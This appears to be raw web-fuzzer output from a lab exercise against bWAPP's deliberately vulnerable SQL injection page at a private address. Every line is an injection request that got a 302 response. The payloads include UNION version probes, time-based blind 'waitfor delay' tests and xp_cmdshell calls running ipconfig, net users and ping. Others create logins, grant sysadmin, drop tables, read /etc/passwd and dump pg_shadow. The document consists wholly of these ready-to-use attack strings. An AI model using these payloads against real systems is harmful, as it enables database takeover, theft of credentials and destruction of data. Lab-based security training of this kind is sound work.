14,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--"
15,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--"
16,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20NULL,%20(select%20@@version))%20--"
17,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
18,302,0L,0W,"%200)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%200)%20waitfor%20delay%20'0:0:2'%20--"
19,302,0L,0W,"%205)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%205)%20waitfor%20delay%20'0:0:2'%20--"
20,302,0L,0W,"%208)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),25,1)%20<>%208)%20waitfor%20delay%20'0:0:2'%20--"
21,302,0L,0W,"%201)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(substring((select%20@@version),24,1)%20<>%201)%20waitfor%20delay%20'0:0:2'%20--"
22,302,0L,0W,%20'sa'%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not(select%20system_user)%20<>%20'sa'%20waitfor%20delay%20'0:0:2'%20--
23,302,0L,0W,%200%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20is_srvrolemember('sysadmin')%20>%200%20waitfor%20delay%20'0:0:2'%20--
24,302,0L,0W,%201)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20<>%201)%20waitfor%20delay%20'0:0:2'%20--
25,302,0L,0W,%200)%20waitfor%20delay%20'0:0:2'%20-->http://10.0.2.4/bWAPP/sqli_1.php?title=';%20if%20not((select%20serverproperty('isintegratedsecurityonly'))%20<>%200)%20waitfor%20delay%20'0:0:2'%20--
26,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
27,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'1
28,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20exec%20sp_%20(or%20exec%20xp_)
29,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%201=1
12,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20(select%20@@version))%20--"
13,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20NULL,%20NULL,%20(select%20@@version))%20--"
8,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20grant%20connect%20to%20name;%20grant%20resource%20to%20name;%20--
9,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20insert%20into%20users(login,%20password,%20level)%20values(%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72)%20+%20char(0x70)%20+%20char(0x65)%20+%20char(0x74)%20+%20char(0x65)%20+%20char(0x72),char(0x64)"
10,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20or%201=1%20--
11,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20(select%20@@version)%20--
1,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=﻿';%20exec%20master..xp_cmdshell%20'ping%2010.10.1.2'--
30,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20and%201=(select%20count(*)%20from%20tablenames);%20--
2,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='create%20user%20name%20identified%20by%20'pass123'%20--
3,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='create%20user%20name%20identified%20by%20pass123%20temporary%20tablespace%20temp%20default%20tablespace%20users;
4,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20;%20drop%20table%20temp%20--
5,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='exec%20sp_addlogin%20'name'%20,%20'password'%20--"
6,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20exec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin'%20--"
7,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20insert%20into%20mysql.user%20(user,%20host,%20password)%20values%20('name',%20'localhost',%20password('pass123'))%20--"
34,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1
31,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20or%201=1
32,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20or%20'1'='1
33,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
35,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%20user_name()%20=%20'dbo'
36,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=\';%20desc%20users;%20--
37,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1\'1
38,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20and%20non_existant_table%20=%20'1
40,302,0L,0W,"%20116>http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%20ascii(lower(substring((select%20top%201%20name%20from%20sysobjects%20where%20xtype='u'),%201,%201)))%20>%20116"
41,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=1%20union%20all%20select%201,2,3,4,5,6,name%20from%20sysobjects%20where%20xtype%20=%20'u'%20--"
42,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20uni/**/on%20select%20all%20from%20where
39,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20or%20username%20is%20not%20NULL%20or%20username%20=%20'
43,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
44,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@version
45,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@servernamee
46,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@microsoftversione
47,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20master..sysserverse
48,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20sysusers
49,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'ipconfig+/all'
50,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'net+view'
51,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'net+users'
52,302,0L,0W,'>http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'ping+'
53,302,0L,0W,\\backupdb.dat'>http://10.0.2.4/bWAPP/sqli_1.php?title=BACKUP%20database%20master%20to%20disks='\\\\backupdb.dat'
54,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=create%20table%20myfile%20(line%20varchar(8000))""%20bulk%20insert%20foo%20from%20'c:\inetpub\wwwroot\auth.aspâ'""%20select%20*%20from%20myfile""--"
55,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
56,302,0L,0W,'%20OR%201=1-->http://10.0.2.4/bWAPP/sqli_1.php?title='%20OR%201=1--
58,302,0L,0W,'-->http://10.0.2.4/bWAPP/sqli_1.php?title='--
57,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='OR%20''%20=%20' Allows%20authentication%20without%20a%20valid%20username.
59,302,0L,0W,"',%20''%201-->http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20select%201,%20'',%20''%201--"
60,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='OR%201=1--
61,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
62,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20version();
63,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_database();
64,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_user;
66,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('log_connections');
65,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20session_user;
68,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('port');
67,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('log_statement');
69,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('password_encryption');
70,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('krb_server_keyfile');
71,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('virtual_host');
72,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('port');
73,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('config_file');
74,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('hba_file');
76,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20pg_shadow;
75,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('data_directory');
77,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20pg_group;
78,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=create%20table%20myfile%20(input%20TEXT);
80,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20myfile;copy%20myfile%20to%20/tmp/test;
79,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=copy%20myfile%20from%20'/etc/passwd';
81,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
84,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20/*
82,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20/*
83,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20--
86,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20/*"
85,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20--
87,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20--"
89,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20--
88,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20/*
90,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20/*
91,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20--
93,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20--"
94,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
92,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20/*"
96,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL)%20waifor%20delay%20'0:0:20'%20/*"
95,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL)%20waitfor%20delay%20'0:0:20'%20--"
100,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL)%20waitfor%20delay%20'0:0:20'%20/*"
99,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL)%20waitfor%20delay%20'0:0:20'%20--"
98,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL)%20waitfor%20delay%20'0:0:20'%20/*"
101,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL)%20waitfor%20delay%20'0:0:20'%20--"
102,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL)%20waifor%20delay%20'0:0:20'%20/*"
97,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL)%20waitfor%20delay%20'0:0:20'%20--"
104,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL)%20waitfor%20delay%20'0:0:20'%20/*"
103,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL)%20waitfor%20delay%20'0:0:20'%20--"
106,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
105,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL)%20waitfor%20delay%20'0:0:20'%20--"
108,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
110,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
107,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
109,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
111,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
112,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
113,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
114,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
117,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
115,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
116,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
118,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
122,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
121,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
119,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
126,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
120,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
124,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
127,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
128,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
123,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
125,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
131,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
130,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
129,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
132,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
133,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
135,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
137,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
134,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
136,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
138,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
139,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
140,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
142,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
141,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
143,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
144,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
148,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
145,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
146,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
149,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
147,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
151,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
150,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
152,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
154,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
153,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
155,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
156,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
157,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
158,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
159,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
161,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
163,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
162,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
160,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
167,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
164,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
165,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
168,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
166,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
169,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
172,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
170,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
171,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
174,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
173,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
175,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
176,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
177,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
179,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
181,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
184,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
183,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
180,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
178,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
182,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
189,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
190,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20/*
185,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
192,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20/*
186,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
187,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
191,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20--
188,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
195,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20waitfor%20delay%20'0:0:20'%20--"
193,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20--
197,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20--
194,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20waitfor%20delay%20'0:0:20'%20/*"
198,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20/*
196,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20/*
199,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20--
200,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20waitfor%20delay%20'0:0:20'%20/*
203,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20waitfor%20delay%20'0:0:20'%20--
202,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20waitfor%20delay%20'0:0:20'%20/*
205,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))))))%20waitfor%20delay%20'0:0:20'%20--
204,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))))%20waitfor%20delay%20'0:0:20'%20--
201,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20waitfor%20delay%20'0:0:20'%20--
208,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20/*"
207,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20--
206,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20/*
209,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20--"
212,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20/*"
213,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20--"
